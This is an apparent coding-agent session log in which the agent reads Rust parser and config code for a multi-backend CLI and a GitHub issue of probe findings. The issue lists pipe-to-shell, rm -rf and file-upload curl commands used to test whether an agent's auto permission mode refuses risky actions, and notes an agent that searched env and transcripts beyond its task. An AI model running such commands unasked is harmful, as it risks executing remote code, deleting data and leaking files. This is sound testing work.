s"}}],"api":"openai-responses","provider":"opencode-go","model":"muse-spark-1.3-contributor","usage":{"input":2346,"output":2016,"cacheRead":54257,"cacheWrite":0,"reasoning":1776,"totalTokens":58619,"cost":{"input":0.0002346,"output":0.00040320000000000004,"cacheRead":0.00010851400000000001,"cacheWrite":0,"total":0.000746314}},"stopReason":"toolUse","timestamp":1790855543370,"responseId":"resp_6abe497875673c5712f04fae","rawStopReason":"completed","thinkingLevel":"high"},{"role":"toolResult","toolCallId":"call_01a0f74f59b370aebd549bcb7e804a80|fc_01a0f74f59b370aebd549bcb7e804a80","toolName":"read","content":[{"type":"text","text":"use crate::types::Usage;\nuse serde::Deserialize;\nuse serde_json::Value;\n\n/// Each field decodes on its own: one malformed field reads as absent instead of voiding the rest.\n/// Shared by the cursor parser and, later, the Claude parser (#17).\n#[derive(Debug, Clone, Default, Deserialize)]\npub(crate) struct RawCursorJson {\n    #[serde(default, deserialize_with = \"crate::util::lenient\")]\n    pub is_error: Option<bool>,\n    #[serde(default, deserialize_with = \"crate::util::lenient\")]\n    pub duration_ms: Option<f64>,\n    #[serde(default, deserialize_with = \"crate::util::lenient\")]\n    pub result: Option<String>,\n    #[serde(default, deserialize_with = \"crate::util::lenient\")]\n    pub session_id: Option<String>,\n    #[serde(default, deserialize_with = \"crate::util::lenient\")]\n    pub usage: Option<Usage>,\n}\n\n#[derive(Debug, Clone, Default, PartialEq)]\npub struct StreamState {\n    pub last_tool: Option<String>,\n    pub tokens_so_far: f64,\n    pub last_assistant: Option<String>,\n    pub files_touched: Vec<String>,\n    pub phase: Option<String>,\n}\n\npub fn init_stream_state() -> StreamState {\n    StreamState::default()\n}\n\n#[derive(Debug, Clone, Default)]\npub struct ParsedLine {\n    pub(crate) result: Option<RawCursorJson>,\n    pub changed: bool,\n}\n\nconst PATH_ARG_KEYS: [&str; 5] = [\"path\", \"filePath\", \"file_path\", \"target\", \"destination\"];\n\nfn path_from_args(args: Option<&Value>) -> Option<String> {\n    let obj = args?.as_object()?;\n    for key in PATH_ARG_KEYS {\n        if let Some(v) = obj\n            .get(key)\n            .and_then(|x| x.as_str())\n            .filter(|s| !s.is_empty())\n        {\n            return Some(v.to_string());\n        }\n    }\n    None\n}\n\nfn extract_tool(tc: &Value) -> (Option<String>, Option<String>) {\n    if let Some(mcp) = tc.get(\"mcpToolCall\") {\n        let tool = mcp\n            .get(\"toolName\")\n            .and_then(|x| x.as_str())\n            .unwrap_or(\"mcp\")\n            .to_string();\n        return (Some(tool), None);\n    }\n    if let Some(obj) = tc.as_object() {\n        for (key, val) in obj {\n            if let Some(name) = key.strip_suffix(\"ToolCall\") {\n                let args = val.get(\"args\");\n                return (Some(name.to_string()), path_from_args(args));\n            }\n        }\n    }\n    (None, None)\n}\n\nfn extract_assistant_text(message: Option<&Value>) -> Option<String> {\n    let content = message?.get(\"content\")?.as_array()?;\n    let parts: Vec<&str> = content\n        .iter()\n        .filter(|b| b.get(\"type\").and_then(|t| t.as_str()) == Some(\"text\"))\n        .filter_map(|b| b.get(\"text\").and_then(|t| t.as_str()))\n        .collect();\n    if parts.is_empty() {\n        return None;\n    }\n    Some(parts.join(\"\"))\n}\n\npub fn parse_line(line: &str, state: &mut StreamState) -> ParsedLine {\n    let trimmed = line.trim();\n    if trimmed.is_empty() {\n        return ParsedLine {\n            changed: false,\n            result: None,\n        };\n    }\n    let ev: Value = match serde_json::from_str(trimmed) {\n        Ok(v) => v,\n        Err(_) => {\n            return ParsedLine {\n                changed: false,\n                result: None,\n            };\n        }\n    };\n    let ty = match ev.get(\"type\").and_then(|t| t.as_str()) {\n        Some(t) => t,\n        None => {\n            return ParsedLine {\n                changed: false,\n                result: None,\n            };\n        }\n    };\n\n    let mut changed = false;\n    if let Some(n) = ev\n        .pointer(\"/usage/outputTokens\")\n        .and_then(|x| x.as_f64())\n        .filter(|n| n.is_finite())\n    {\n        state.tokens_so_far = state.tokens_so_far.max(n);\n        changed = true;\n    }\n\n    match ty {\n        \"tool_call\" => {\n            if ev.get(\"subtype\").and_then(|s| s.as_str()) == Some(\"started\")\n                && ev.get(\"tool_call\").is_some()\n            {\n                state.phase = Some(\"running_tool\".into());\n                changed = true;\n                let (tool, path) = extract_tool(ev.get(\"tool_call\").unwrap());\n                if let Some(t) = tool {\n                    state.last_tool = Some(t);\n                }\n                if let Some(p) = path\n                    && !state.files_touched.contains(&p)\n                {\n                    state.files_touched.push(p);\n                }\n            }\n        }\n        \"assistant\" => {\n            if let Some(text) = extract_assistant_text(ev.get(\"message\")) {\n                let truncated: String = text.chars().take(200).collect();\n                state.last_assistant = Some(truncated);\n                state.phase = Some(\"responding\".into());\n                changed = true;\n            }\n        }\n        \"thinking\" => {\n            if ev.get(\"subtype\").and_then(|s| s.as_str()) == Some(\"delta\")\n                && ev.get(\"text\").and_then(|t| t.as_str()).is_some()\n            {\n                state.phase = Some(\"thinking\".into());\n                changed = true;\n            }\n        }\n        \"result\" => {\n            let raw: RawCursorJson = serde_json::from_value(ev).unwrap_or_default();\n            return ParsedLine {\n                result: Some(raw),\n                changed: true,\n            };\n        }\n        _ => {}\n    }\n\n    ParsedLine {\n        result: None,\n        changed,\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n    use serde_json::json;\n\n    #[test]\n    fn ignores_blank_and_non_json() {\n        let mut s = init_stream_state();\n        assert!(!parse_line(\"\", &mut s).changed);\n        assert!(!parse_line(\"   \", &mut s).changed);\n        assert!(!parse_line(\"not json\", &mut s).changed);\n    }\n\n    #[test]\n    fn ignores_events_with_no_type() {\n        let mut s = init_stream_state();\n        assert!(!parse_line(&json!({\"foo\":1}).to_string(), &mut s).changed);\n    }\n\n    #[test]\n    fn shell_tool_call_sets_last_tool() {\n        let mut s = init_stream_state();\n        parse_line(\n            &json!({\n                \"type\":\"tool_call\",\"subtype\":\"started\",\n                \"tool_call\":{\"shellToolCall\":{}}\n            })\n            .to_string(),\n            &mut s,\n        );\n        assert_eq!(s.last_tool.as_deref(), Some(\"shell\"));\n        assert_eq!(s.phase.as_deref(), Some(\"running_tool\"));\n    }\n\n    #[test]\n    fn edit_tool_call_records_path() {\n        let mut s = init_stream_state();\n        parse_line(\n            &json!({\n                \"type\":\"tool_call\",\"subtype\":\"started\",\n                \"tool_call\":{\"editToolCall\":{\"args\":{\"path\":\"src/a.ts\"}}}\n            })\n            .to_string(),\n            &mut s,\n        );\n        assert_eq!(s.last_tool.as_deref(), Some(\"edit\"));\n        assert_eq!(s.files_touched, [\"src/a.ts\"]);\n    }\n\n    #[test]\n    fn write_delete_record_path_shaped_args() {\n        let mut s = init_stream_state();\n        parse_line(\n            &json!({\n                \"type\":\"tool_call\",\"subtype\":\"started\",\n                \"tool_call\":{\"writeToolCall\":{\"args\":{\"filePath\":\"src/new.ts\"}}}\n            })\n            .to_string(),\n            &mut s,\n        );\n        assert_eq!(s.last_tool.as_deref(), Some(\"write\"));\n        assert_eq!(s.files_touched, [\"src/new.ts\"]);\n        parse_line(\n            &json!({\n                \"type\":\"tool_call\",\"subtype\":\"started\",\n                \"tool_call\":{\"deleteToolCall\":{\"args\":{\"path\":\"old.ts\"}}}\n            })\n            .to_string(),\n            &mut s,\n        );\n        assert_eq!(s.files_touched, [\"src/new.ts\", \"old.ts\"]);\n    }\n\n    #[test]\n    fn mcp_tool_call_uses_tool_name() {\n        let mut s = init_stream_state();\n        parse_line(\n            &json!({\n                \"type\":\"tool_call\",\"subtype\":\"started\",\n                \"tool_call\":{\"mcpToolCall\":{\"toolName\":\"search\"}}\n            })\n            .to_string(),\n            &mut s,\n        );\n        assert_eq!(s.last_tool.as_deref(), Some(\"search\"));\n        let mut s2 = init_stream_state();\n        parse_line(\n            &json!({\n                \"type\":\"tool_call\",\"subtype\":\"started\",\n                \"tool_call\":{\"mcpToolCall\":{}}\n            })\n            .to_string(),\n            &mut s2,\n        );\n        assert_eq!(s2.last_tool.as_deref(), Some(\"mcp\"));\n    }\n\n    #[test]\n    fn non_started_does_not_update() {\n        let mut s = init_stream_state();\n        parse_line(\n            &json!({\n                \"type\":\"tool_call\",\"subtype\":\"completed\",\n                \"tool_call\":{\"shellToolCall\":{}}\n            })\n            .to_string(),\n            &mut s,\n        );\n        assert!(s.last_tool.is_none());\n    }\n\n    #[test]\n    fn assistant_text_truncated_to_200() {\n        let mut s = init_stream_state();\n        let long = \"x\".repeat(300);\n        parse_line(\n            &json!({\n                \"type\":\"assistant\",\n                \"message\":{\"content\":[{\"type\":\"text\",\"text\": long}]}\n            })\n            .to_string(),\n            &mut s,\n        );\n        assert_eq!(s.last_assistant.as_ref().map(|t| t.len()), Some(200));\n        assert_eq!(s.phase.as_deref(), Some(\"responding\"));\n    }\n\n    #[test]\n    fn thinking_delta_sets_phase() {\n        let mut s = init_stream_state();\n        parse_line(\n            &json!({\"type\":\"thinking\",\"subtype\":\"delta\",\"text\":\"hmm\"}).to_string(),\n            &mut s,\n        );\n        assert_eq!(s.phase.as_deref(), Some(\"thinking\"));\n    }\n\n    #[test]\n    fn usage_output_tokens_updates() {\n        let mut s = init_stream_state();\n        parse_line(\n            &json!({\"type\":\"assistant\",\"usage\":{\"outputTokens\":42}}).to_string(),\n            &mut s,\n        );\n        assert_eq!(s.tokens_so_far, 42.0);\n    }\n\n    #[test]\n    fn tokens_so_far_monotonic() {\n        let mut s = init_stream_state();\n        parse_line(\n            &json!({\"type\":\"assistant\",\"usage\":{\"outputTokens\":100}}).to_string(),\n            &mut s,\n        );\n        parse_line(\n            &json!({\"type\":\"assistant\",\"usage\":{\"outputTokens\":40}}).to_string(),\n            &mut s,\n        );\n        assert_eq!(s.tokens_so_far, 100.0);\n    }\n\n    #[test]\n    fn result_event_returns_raw() {\n        let mut s = init_stream_state();\n        let r = parse_line(\n            &json!({\n                \"type\":\"result\",\"subtype\":\"success\",\"is_error\":false,\n                \"result\":\"final\",\"session_id\":\"sid\",\"duration_ms\":99,\n                \"usage\":{\"outputTokens\":10}\n            })\n            .to_string(),\n            &mut s,\n        );\n        assert!(r.result.is_some());\n        assert_eq!(r.result.as_ref().unwrap().result.as_deref(), Some(\"final\"));\n        assert_eq!(\n            r.result.as_ref().unwrap().session_id.as_deref(),\n            Some(\"sid\")\n        );\n        assert_eq!(s.tokens_so_far, 10.0);\n    }\n\n    #[test]\n    fn malformed_usage_keeps_the_rest_of_the_result() {\n        let mut s = init_stream_state();\n        let r = parse_line(\n            &json!({\n                \"type\":\"result\",\"is_error\":false,\"result\":\"final\",\"session_id\":\"sid\",\n                \"usage\":{\"outputTokens\":\"7\"}\n            })\n            .to_string(),\n            &mut s,\n        );\n        let raw = r.result.unwrap();\n        assert_eq!(raw.result.as_deref(), Some(\"final\"));\n        assert_eq!(raw.session_id.as_deref(), Some(\"sid\"));\n        assert_eq!(raw.is_error, Some(false));\n        assert!(raw.usage.is_none());\n    }\n}\n"}],"isError":false,"timestamp":1790855569308},{"role":"toolResult","toolCallId":"call_01a0f74f5b41774c9540a7b30ede0506|fc_01a0f74f5b41774c9540a7b30ede0506","toolName":"bash","content":[{"type":"text","text":"                    } else {\n                        None\n                    },\n                    message: e.to_string(),\n                })\n            }\n        })),\n    })?;\n    Ok(CliDeps { config })\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n    use std::collections::HashMap;\n    use std::sync::Arc;\n\n    const MODELS_DEFAULT: &str = r#\"{\n  \"default\": \"composer-2.5\",\n  \"models\": {\n    \"composer-2.5\": {\n      \"label\": \"Composer 2.5\",\n      \"backend\": \"cursor\",\n      \"price\": { \"input\": 0.5, \"output\": 2.5, \"cacheRead\": 0.2, \"cacheWrite\": 0 }\n    },\n    \"grok-4.7-high\": {\n      \"label\": \"Grok 4.7 High\",\n      \"backend\": \"cursor\",\n      \"price\": { \"input\": 2, \"output\": 6, \"cacheRead\": 0.5, \"cacheWrite\": 0 }\n    }\n  }\n}\"#;\n\n    fn reader(files: HashMap<String, String>) -> ReadFileFn {\n        let files = Arc::new(files);\n        Box::new(move |path: &str| {\n            files.get(path).cloned().ok_or_else(|| IoErr {\n                code: Some(\"ENOENT\".into()),\n                message: \"ENOENT\".into(),\n            })\n        })\n    }\n\n    #[test]\n    fn loads_models_and_derives_price_map() {\n        let mut files = HashMap::new();\n        files.insert(\"/models.json\".into(), MODELS_DEFAULT.into());\n        let cfg = load_config(LoadConfigOpts {\n            models_path: \"/models.json\".into(),\n            host_profile_path: Some(\"/does-not-exist.json\".into()),\n            read_file: Some(reader(files)),\n        })\n        .unwrap();\n        assert_eq!(cfg.default, \"composer-2.5\");\n        assert_eq!(cfg.models[\"composer-2.5\"].backend, \"cursor\");\n        assert_eq!(cfg.price_map[\"composer-2.5\"].input, 0.5);\n        assert_eq!(cfg.profile, HostProfile::default());\n    }\n\n    #[test]\n    fn merges_host_profile() {\n        let mut files = HashMap::new();\n        files.insert(\"/models.json\".into(), MODELS_DEFAULT.into());\n        files.insert(\n            \"/profile.json\".into(),\n            serde_json::json!({\n                \"default\": \"grok-4.7-high\",\n                \"models\": {\n                    \"openai-codex/gpt-6-luna\": {\n                        \"label\": \"GPT-6 Luna\",\n                        \"backend\": \"pi\",\n                        \"price\": { \"input\": 5, \"output\": 30, \"cacheRead\": 0.5, \"cacheWrite\": 0 }\n                    }\n                },\n                \"idleMs\": 1000\n            })\n            .to_string(),\n        );\n        let cfg = load_config(LoadConfigOpts {\n            models_path: \"/models.json\".into(),\n            host_profile_path: Some(\"/profile.json\".into()),\n            read_file: Some(reader(files)),\n        })\n        .unwrap();\n        assert_eq!(cfg.default, \"grok-4.7-high\");\n        assert!(cfg.models.contains_key(\"composer-2.5\"));\n        assert!(cfg.models.contains_key(\"openai-codex/gpt-6-luna\"));\n        assert_eq!(cfg.models[\"openai-codex/gpt-6-luna\"].backend, \"pi\");\n        assert_eq!(cfg.price_map[\"openai-codex/gpt-6-luna\"].output, 30.0);\n        assert_eq!(cfg.profile.idle_ms, Some(Some(1000.0)));\n    }\n===\n30:            \"model \\\"{model}\\\" uses backend \\\"{}\\\", which is not implemented yet\",\n107:                backend: \"pi\".into(),\n153:            \"model \\\"claude-sonnet-5-5\\\" uses backend \\\"claude\\\", which is not implemented yet\"\n158:    fn pi_backend_is_not_implemented() {\n163:            \"model \\\"openai-codex/gpt-6-luna\\\" uses backend \\\"pi\\\", which is not implemented yet\"\n===\n            cache_read,\n            cache_write,\n        }\n    }\n\n    fn base() -> (String, HashMap<String, ModelEntry>) {\n        let mut models = HashMap::new();\n        models.insert(\n            \"composer-2.5\".into(),\n            ModelEntry {\n                label: \"Composer 2.5\".into(),\n                backend: \"cursor\".into(),\n                price: price(0.5, 2.5, 0.2, 0.0),\n            },\n        );\n        models.insert(\n            \"grok-4.7-high\".into(),\n            ModelEntry {\n                label: \"Grok 4.7 High\".into(),\n                backend: \"cursor\".into(),\n                price: price(2.0, 6.0, 0.5, 0.0),\n            },\n        );\n        models.insert(\n            \"openai-codex/gpt-6-luna\".into(),\n            ModelEntry {\n                label: \"GPT-6 Luna\".into(),\n                backend: \"pi\".into(),\n                price: price(0.1, 0.5, 0.01, 0.125),\n            },\n        );\n        models.insert(\n            \"claude-sonnet-5-5\".into(),\n            ModelEntry {\n                label: \"Claude Sonnet 5.5\".into(),\n                backend: \"claude\".into(),\n                price: price(2.0, 10.0, 0.2, 2.5),\n            },\n        );\n        (\"composer-2.5\".into(), models)\n    }\n\n    #[test]\n    fn omitted_model_resolves_to_default() {\n        let (d, m) = base();\n        let r = resolve_model(None, &(d.as_str(), &m)).unwrap();\n        assert_eq!(r.model, \"composer-2.5\");\n        assert_eq!(r.backend, \"cursor\");\n        assert_eq!(r.price, m[\"composer-2.5\"].price);\n    }\n\n    #[test]\n    fn allowed_id_resolves_with_backend_and_price() {\n        let (d, m) = base();\n        let r = resolve_model(Some(\"grok-4.7-high\"), &(d.as_str(), &m)).unwrap();\n        assert_eq!(r.model, \"grok-4.7-high\");\n        assert_eq!(r.backend, \"cursor\");\n        assert_eq!(r.price, m[\"grok-4.7-high\"].price);\n    }\n\n    #[test]\n"}],"isError":false,"timestamp":1790855569308},{"role":"assistant","content":[{"type":"thinking","thinking":"","thinkingSignature":"{\"id\":\"rs_6abe49939fc51f65b33e4bcc:rs_01a0f74f662976bba2a94208454af71e\",\"type\":\"reasoning\",\"status\":\"completed\",\"encrypted_content\":\"Q-PaDgFdOYntXXtEx1p5zy84e1DS9GNSAcY-pWdkTrV8NuuFthNlf1M-nOW9leh4c_hIg5lQpriyftvPlx0HXps15B0y2k9mafQiFK4K4-4nCwtAPjmO8AtrlPVFlPNi5QQEiv8Bf5v_jmWDmvDsG98zUbo6o_Grf0ri_dDh-6cQvYfBiTlSghVmHdEtM2_DY6dALf4FpwPEBnUVHv9RxMZQ9wVF2bdUIXhtPfRix-BA0L5wMqxOEeE2zlv-25u8kd2LqJbVwoEs5NAWlaH_1gZQkuZ4u5hHOnATtjDfHpuen25B-YGsEsoENVjJEws3PM_JcjZA8Oub8cNm_cZkPwlOQzf_uhRqk53wD3Ky-9E95owQU0hIaViZ9c1LHjC8XNIA86kEM4L0A_RnhqqWhNjEpDSMYBrWw3zz_z3wy90fRW6OQqN3PPTBp1kq699Fr5EQKXcqtPFOQix4M5y7idAVVS_k0ZhFVcs5kvUtV24RhvbeTFnCtgEq9RgJv7_xH-O6K3DvbOznYnRluMfXR0BEDON6XKYw7pW_IIMYSb2aJLLSPWvo4SoX9cxkWCF0rMizwMvLnz0mC6ECAAC2y9a45MnaIocGciAL15HmQC7y9HSpdbAyO1UoGHU-kGRH-onky3jYLFOC05XuUlYggwfTHqLukicNrZpVq-shDPnhpWnZHAUApLU5c1wq5VX5Nxq1xsID0Tm7oBfIcOgwtoHURt7aB9GC1q7lZp5iq1httMH9HboxEQOUBtkpAGxM7Nbvq5Gr2w0VpG6fPWD7aPBN5Tt6s9YqVV6rlFSSruvq9uub97JiAbCDjLH10_ezIP4p99lJ3gsF-SgeJm0LFmVr0JygirKbl5bCkxw3MZOHqqWa_uOanKBQcZEaBL7_G5xZMi8c-yWvSl3qa4YvshFKUNru8hhwhSLAC-EOCR9gldzzljhZzxvKOxdQjHrtjE1NiEc8Zz8t0iEkGtZ3Sd7iIAOt8MBE9WWy2KmXPaRvTEyIQxioy5VJQMGrNCCUz5t4YHnivZSY01fYggZrCJhzpkQIWOddzc2yH_EkeDcK_tKwvZt1KmNUCFzWGNzHAertBRy64wBexDUVa67X6tY062ecb1yE3oiP9BJ_gY2qoEOoQ_omIa_jISq7za6vCB6_xCpawg2MSJ1Cr06tOkzVPdpvDiU8RBXLsNxxLk7WzVz6KHfYJVdIdDyj44cLcf_HPoyF6uHuCROfXzLtBe_3M7VsdilgEJsqT-KDsrSz-0K53q_jYEypx5pxoc4awm31OkoKMWxufWmowTUNMz4IzhNGW4Y3HjC44WXPg3fwg8fvRkavkZBcUY8EfQlrqPqHWZDo64Opvxd-iqHJ0DauZO_RgC31ONU4tc_2zActWsqi4M0w0MF2tmCYHn8MKBhhSJUxVRXA6DNArA\",\"summary\":[]}"},{"type":"toolCall","id":"call_01a0f74f6afb70f098320944e11e8fdf|fc_01a0f74f6afb70f098320944e11e8fdf","name":"bash","arguments":{"command":"gh issue view 4 --comments 2>/dev/null | head -80; echo ===; cat models.json 2>/dev/null || find . -maxdepth 2 -name \"models.json\" | head; echo ===; sed -n '140,175p' src/models.rs"}}],"api":"openai-responses","provider":"opencode-go","model":"muse-spark-1.3-contributor","usage":{"input":6092,"output":180,"cacheRead":56561,"cacheWrite":0,"reasoning":70,"totalTokens":62833,"cost":{"input":0.0006092000000000001,"output":0.000036,"cacheRead":0.000113122,"cacheWrite":0,"total":0.0007583220000000001}},"stopReason":"toolUse","timestamp":1790855569310,"responseId":"resp_6abe49939fc51f65b33e4bcc","rawStopReason":"completed","thinkingLevel":"high"},{"role":"toolResult","toolCallId":"call_01a0f74f6afb70f098320944e11e8fdf|fc_01a0f74f6afb70f098320944e11e8fdf","toolName":"bash","content":[{"type":"text","text":"author:\tuser\nassociation:\towner\nedited:\ttrue\nstatus:\tnone\n--\n## Probe findings from #6 (2026-10-01)\n\nPR: #18. Fixtures: `tests/fixtures/{cursor,pi,claude}/*.stdout` recorded with `scripts/record.sh` (cursor-agent 2026.09.28, pi 0.99.2, claude 2.1.286; models composer-2.5, openai-codex/gpt-6-luna, claude-sonnet-5-5). Each fixture has `.argv` and `.stderr` beside it.\n\n### Does headless Claude in plan mode answer, or propose a plan?\n\nIt depends on the prompt.\n\n- A question or a review gets a direct answer. `claude/plan-plain-answer` returns `391`. `claude/plan-review` runs a read-only `Bash cat` and returns its findings. Both end `STATUS: DONE`.\n- An edit request gets no edit. `claude/plan-edit-request` reads the files, writes a plan to `~/.claude/plans/*.md` (outside cwd), and ends: \"Turn plan mode off, or tell me to proceed, and I'll do it. STATUS: NEEDS_CONTEXT\". The tree was unchanged.\n- `permission_denials` is `[]` in every run. No ExitPlanMode call appears in the stream.\n\n**Decision for #17: keep `--permission-mode plan` for read-only Claude. No fallback.** It answers read-only work and refuses edits by ending NEEDS_CONTEXT, which resume handles (`--capability read-write`). A `--disallowedTools Edit,Write,…` fallback would block plan-file writes but not Bash, so it is weaker. Not tested: whether plan mode blocks a writing Bash command.\n\n### How often does auto mode refuse, and what does a refusal look like?\n\n0 refusals in 3 probes, with `permissionMode: \"auto\"` confirmed in each `system/init` event:\n\n- `claude/auto-refusal`: `curl -s https://example.com | sh` ran (it failed on HTML). For `rm -rf ~/Downloads/old-builds`, the model checked with `ls` first; the directory was absent.\n- `claude/auto-refusal-exfil`: `curl -X POST --data-binary @calc.py https://httpbin.org/post` ran and the POST succeeded.\n\nNo refusal was captured, so its stream shape is still unknown. The likely shape is a `tool_result` with `is_error: true` plus an entry in the result line's `permission_denials`. The parser should surface `permission_denials` when it is non-empty.\n\nA delegated Claude also loads the user's global instructions. In `claude/auto-fix` it committed the fix on a new branch (`fix-add-operator`) and left the tree clean. The change-set must count commits, not only dirty files.\n\n### Does `--session-id` create the session, and does a second run continue it?\n\nYes, for both pi and Claude.\n\n- **pi:** a first use prints `Warning: No project session found with id '<id>'; creating a new session with that id.` on stderr and exits 0. The second run with the same id (`pi/resume-answer`) prints no warning, and the model answers `392` (previous answer + 1). The `session` header line carries the id.\n- **claude:** `--session-id <uuid>` on the first run, then `--resume <uuid>` (`claude/resume-answer`) answers `392`. The result line keeps the same `session_id`. Untested: reusing `--session-id` on an existing session; the spec uses `--resume`.\n- **cursor:** `--resume <session_id from the result line>` (`cursor/resume-answer`) answers `392`.\n\n### Errors\n\n- **cursor** (`cursor/error-bad-model`): exits 1 with empty stdout. stderr holds the message and the list of valid models.\n- **pi** (`pi/error-bad-model`): **exits 0**. stderr warns `Model \"no-such-model\" not found … Using custom model id.` The stream ends normally with `agent_end`, whose last message has `stopReason: \"error\"` and `errorMessage: \"Codex error: The 'no-such-model' model is not supported …\"`. The parser must read `stopReason`, not the exit code.\n- **claude** (`claude/error-bad-model`): exits 1. stdout has a `result` line with `subtype: \"success\"`, `is_error: true` and the message in `result`. stderr has `[claude-code:unrecognized_model]`. The parser must read `is_error`, not `subtype`.\n\n### Cancelled (SIGTERM to the CLI)\n\nAll three backends exit 143 and stop mid-stream (`*/cancelled`). No `result` or `agent_end` line is written. The supervisor marks CANCELLED itself; nothing in the stream says so.\n\n### NEEDS_CONTEXT\n\nAll three backends end with a question and `STATUS: NEEDS_CONTEXT` in the final text (`*/needs-context`). In a first attempt, cursor searched widely before asking (its own transcript store, `env`, a filesystem glob), which produced a 960KB stream that held the user's MCP tool descriptors. The committed fixture was re-recorded with \"do not search, ask me\".\n\n### Redaction\n\nRaw streams carry the recording user's setup: pi's system-prompt `sections` and extension `toolsAdded`, and Claude's `system/init` lists and `hook_response` output. `scripts/redact.jq` blanks these and keeps the event shapes. `record.sh` applies it and replaces the home-directory name. Any live test that records fixtures (#17 and the per-backend live tests) must use the same filter.\n\n### Cost and usage\n\n- **claude:** `total_cost_usd` on the result line.\n- **cursor:** the result line has `usage` with `inputTokens`, `outputTokens`, `cacheReadTokens` and `cacheWriteTokens`, and no cost.\n- **pi:** `usage.cost` appears on messages. The `agent_end` last-message cost (`$0.00016` in `pi/tool-calls-fix`) looks per-message. #16 should verify whether the run total needs summing over `message_end` events.\n\n### Stream noise the parsers must skip\n\n- **claude:** `system/hook_started`, `system/hook_response` (4 of them from user hooks), `system/commands_changed` and `rate_limit_event` arrive before the assistant turn.\n- **pi:** `entry_appended` and `turn_*`, and a final `agent_settled` after `agent_end`.\n- **cursor:** `thinking/delta` and `thinking/completed`.\n\n\n--\n===\n./config/models.json\n===\n    #[test]\n    fn unknown_id_throws_model_not_allowed() {\n        let (d, m) = base();\n        let e = resolve_model(Some(\"not-listed\"), &(d.as_str(), &m)).unwrap_err();\n        assert!(e.downcast_ref::<ModelNotAllowedError>().is_some());\n    }\n\n    #[test]\n    fn claude_backend_is_not_implemented() {\n        let (d, m) = base();\n        let e = resolve_model(Some(\"claude-sonnet-5-5\"), &(d.as_str(), &m)).unwrap_err();\n        assert_eq!(\n            e.to_string(),\n            \"model \\\"claude-sonnet-5-5\\\" uses backend \\\"claude\\\", which is not implemented yet\"\n        );\n    }\n\n    #[test]\n    fn pi_backend_is_not_implemented() {\n        let (d, m) = base();\n        let e = resolve_model(Some(\"openai-codex/gpt-6-luna\"), &(d.as_str(), &m)).unwrap_err();\n        assert_eq!(\n            e.to_string(),\n            \"model \\\"openai-codex/gpt-6-luna\\\" uses backend \\\"pi\\\", which is not implemented yet\"\n        );\n    }\n}\n"}],"isError":false,"timestamp":1790855574539},{"role":"assistant","content":[{"type":"toolCall","id":"call_01a0f74f77ec77d98b53e541ed7b5c2b|fc_01a0f74f77ec77d98b53e541ed7b5c2b","name":"bash","arguments":{"command":"python3 -c \"import json; d=json.load(open('config/models.json')); print(d.get('default')); [print(k,'|',v.get('backend'),'|',v.get('label')) for k,v in d['models'].items()]\"; echo ===; grep -rn \"pi auth check\\|auth check\" src/ tests/ scripts/ docs/ 2>/dev/null | head; echo ===; grep -n \"opencode\" tests/cli_e2e.rs tests/budgets.rs | head"}}],"api":"openai-responses","provider":"opencode-go","model":"muse-spark-1.3-contributor","usage":{"input":1974,"output":149,"cacheRead":62577,"cacheWrite":0,"reasoning":0,"totalTokens":64700,"cost":{"input":0.00019740000000000003,"output":0.000029800000000000003,"cacheRead":0.00012515400000000002,"cacheWrite":0,"total":0.00035235400000000004}},"stopReason":"toolUse","timestamp":1790855574541,"responseId":"resp_6abe49970c8b2fdf884949eb","rawStopReason":"completed","thinkingLevel":"high"},{"role":"toolResult","toolCallId":"call_01a0f74f77ec77d98b53e541ed7b5c2b|fc_01a0f74f77ec77d98b53e541ed7b5c2b","toolName":"bash","content":[{"type":"text","text":"tests/fixtures/claude/review-19.stdout:16:{\"type\":\"user\",\"message\":{\"role\":\"user\",\"content\":[{\"tool_use_id\":\"toolu_01CtvwRn678gy36PGvnifeBK\",\"type\":\"tool_result\",\"content\":\"title:\\tci: Linux workflow (fmt, clippy, tests) (#8)\\nstate:\\tDRAFT\\nauthor:\\tuser (Amogh Akshintala)\\nlabels:\\t\\nassignees:\\t\\nreviewers:\\t\\nprojects:\\t\\nmilestone:\\t\\nnumber:\\t19\\nurl:\\thttps://github.com/user/delegate/pull/19\\nadditions:\\t23\\ndeletions:\\t0\\nauto-merge:\\tdisabled\\n--\\nFixes #8\\n\\nOne `ci` job on `ubuntu-latest` for pull requests and pushes to `main`: `cargo fmt --check`, `cargo clippy --all-targets -- -D warnings`, `cargo test`. Ignored live tests stay excluded. Every action is pinned by SHA, the token is read-only, and `pull_request_target` is not used.\\n\\nImplemented by composer-2.5 via `scripts/record.sh` (fixture lands with #18).\\n\\nCo-authored with Claude Code.\\ndiff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml\\nnew file mode 100644\\nindex 0000000..ede11d5\\n--- /dev/null\\n+++ b/.github/workflows/ci.yml\\n@@ -0,0 +1,23 @@\\n+name: CI\\n+\\n+on:\\n+  push:\\n+    branches: [main]\\n+  pull_request:\\n+\\n+permissions:\\n+  contents: read\\n+\\n+jobs:\\n+  ci:\\n+    runs-on: ubuntu-latest\\n+    steps:\\n+      - uses: actions/checkout@fbc6f3992d24b796d5a048ff273f7fcc4a7b6c09 # v5\\n+      - uses: dtolnay/rust-toolchain@6bed0761d98439e5a578e2877258200ad565ba87 # stable\\n+        with:\\n+          toolchain: stable\\n+          components: rustfmt, clippy\\n+      - uses: Swatinem/rust-cache@6323deb102c322ba6fcbdcafc7e3dddab59af2b6 # v2.9.2\\n+      - run: cargo fmt --check\\n+      - run: cargo clippy --all-targets -- -D warnings\\n+      - run: cargo test\\ntitle:\\tCI on Linux\\nstate:\\tOPEN\\nauthor:\\tuser (Amogh Akshintala)\\nlabels:\\tready-for-agent\\ncomments:\\t0\\nassignees:\\t\\nprojects:\\t\\nmilestone:\\t\\nissue-type:\\t\\nparent:\\t\\nsub-issues:\\t\\nsub-issues-completed:\\t\\nblocked-by:\\tuser/delegate#6\\nblocking:\\t\\nnumber:\\t8\\n--\\n## Parent\\n\\n#4\\n\\n## What to build\\n\\nGitHub Actions CI on Linux (`ubuntu-latest`) running the format check, clippy with warnings as errors, and the test suite, on every push and pull request. Live tests stay excluded. macOS is tested locally.\\n\\nDrive this ticket's implementation through the recording script, saving the run as a fixture.\\n\\n## Acceptance criteria\\n\\n- [ ] The workflow runs on pull requests and on pushes to main.\\n- [ ] It passes on the current code, or the Linux-only failures it surfaces are fixed.\\n- [ ] Ignored live tests are not run.\\n\\n## Blocked by\\n\\n- #6 Record headless fixtures (recording script and probes)\\ntitle:\\tSpec: delegate, a multi-backend CLI replacing the cursor-delegate MCP 